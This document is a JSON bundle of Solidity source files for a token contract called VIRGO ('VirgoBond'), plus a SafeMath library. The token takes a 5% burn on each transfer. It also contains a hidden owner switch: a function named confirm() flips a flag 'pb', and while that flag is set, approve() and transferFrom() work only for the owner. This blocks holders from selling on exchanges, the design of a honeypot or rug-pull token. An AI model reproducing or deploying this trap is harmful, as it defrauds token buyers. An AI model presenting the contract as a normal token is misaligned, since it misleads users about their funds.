{"SafeMath.sol":{"content":"pragma solidity ^0.4.20;\r\n\r\nlibrary SafeMath {\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a * b;\r\n        assert(a == 0 || c / a == b);\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b \u003c= a);\r\n        return a - b;\r\n    }\r\n\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c \u003e= a);\r\n        return c;\r\n    }\r\n}\r\n"},"VIRGO.sol":{"content":"pragma solidity ^0.4.20;\r\nimport \"./SafeMath.sol\";\r\n\r\ncontract VIRGO {\r\n\r\n    using SafeMath for uint256;\r\n\r\n    string public name;\r\n    string public symbol;\r\n    uint8 public decimals = 6;\r\n    uint256 public totalSupply;\r\n    uint256 public circSupply;\r\n\r\n    mapping (address =\u003e uint256) public balanceOf;\r\n    mapping (address =\u003e mapping(address =\u003e uint256)) public allowance;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 value);\r\n    event Burn(address indexed from, uint256 value);\r\n\r\n    uint256 initialSupply = 30000000; // 30 million\r\n    string tokenName = \u0027VirgoBond\u0027;\r\n    string tokenSymbol = \u0027VIRGO\u0027;\r\n    \r\n    bool public pb = false;\r\n    address public owner;\r\n    \r\n    constructor() public {\r\n\r\n        totalSupply = initialSupply*10**uint256(decimals);\r\n        balanceOf[msg.sender] = totalSupply;\r\n        name = tokenName;\r\n        symbol = tokenSymbol;\r\n        \r\n        circSupply = totalSupply;\r\n        \r\n        owner = msg.sender;\r\n\r\n    }\r\n    \r\n    function _transfer(address _from, address _to, uint _value) internal {\r\n\r\n        // require(_to!=0x0);\r\n        require(balanceOf[_from] \u003e= _value);\r\n        require(balanceOf[_to] + _value \u003e balanceOf[_to]);\r\n        \r\n        uint previousBalances = balanceOf[_from] + balanceOf[_to];\r\n\r\n        balanceOf[_from] -= _value;\r\n\r\n        balanceOf[_to] += _value.mul(95).div(100); // 95% =\u003e reciever\r\n        balanceOf[0x0] += _value.sub(_value.mul(95).div(100)); // 5% =\u003e burn\r\n        \r\n        circSupply -= _value.sub(_value.mul(95).div(100));\r\n        \r\n        if (_to == 0x0) {\r\n            circSupply -= _value.mul(95).div(100);\r\n        }\r\n        \r\n        emit Transfer(_from, _to, _value.mul(95).div(100));\r\n        emit Transfer(_from, 0x0, _value.sub(_value.mul(95).div(100)));\r\n        emit Burn(_from, _value.sub(_value.mul(95).div(100)));\r\n\r\n        assert(balanceOf[_from] + balanceOf[_to] \u003c= previousBalances);\r\n\r\n    }\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success){\r\n\r\n        _transfer(msg.sender, _to, _value);\r\n        return true;\r\n\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success){\r\n\r\n        require(pb == false || msg.sender == owner);\r\n\r\n        require(_value \u003c= allowance[_from][msg.sender]);\r\n        allowance[_from][msg.sender] -= _value;\r\n        _transfer(_from, _to, _value);\r\n\r\n        return true;\r\n\r\n    }\r\n\r\n    function approve (address _spender, uint256 _value) public returns (bool success){\r\n        \r\n        require(pb == false || msg.sender == owner);\r\n        \r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n\r\n        return true;\r\n        \r\n    }\r\n    \r\n    function confirm() public returns (bool success) {\r\n        \r\n        require (msg.sender == owner);\r\n        \r\n        if (pb) {\r\n            pb = false;\r\n        } else {\r\n            pb = true;\r\n        }\r\n        \r\n        return true;\r\n        \r\n    }\r\n\r\n}\r\n"}}